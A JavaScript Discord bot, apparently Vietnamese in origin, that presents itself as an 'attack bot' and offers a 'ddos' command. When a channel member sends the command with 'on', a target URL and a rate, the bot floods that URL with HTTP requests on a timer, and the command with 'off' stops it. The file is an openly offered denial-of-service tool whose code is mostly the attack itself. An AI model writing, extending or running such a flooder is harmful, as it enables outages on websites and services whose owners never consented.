const Discord = require('discord.js');
const client = new Discord.Client();
const request = require('request');
const auth = require('./auth.json');
var ATK;


client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
	client.user.setPresence({
        status: "online",
        game: {
            name: "Bot tấn công",
            type: "STREAMING"
        }
    }); 
});


client.on('message', message => {

if (message.author.bot) return;
const prefix = auth.prefix;
if (message.content.startsWith(prefix)) {
	
	const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();
	
	
	if(command === 'ping') {
		message.channel.send('Pong!')
	}
	if(command === 'ddos') {
		var arr = message.content.split(" "),
			target,
			req,
			time;
			function sendReq() {
				request(target, function (error, response, body){
						if(error) {console.log(error)}
						else{console.log('OK')}
					})
				}
		if (arr[1] === 'on'){
			target = arr[2],
			req = arr[3]||NULL;
			time = 1000/Number(arr[3]);
			ATK = setInterval(() => sendReq(), time)
		}
		if (arr[1] === 'off'){
			message.channel.send('OFF');
			clearInterval(ATK);
		}
	}
}
})

client.login(process.env.TOKEN)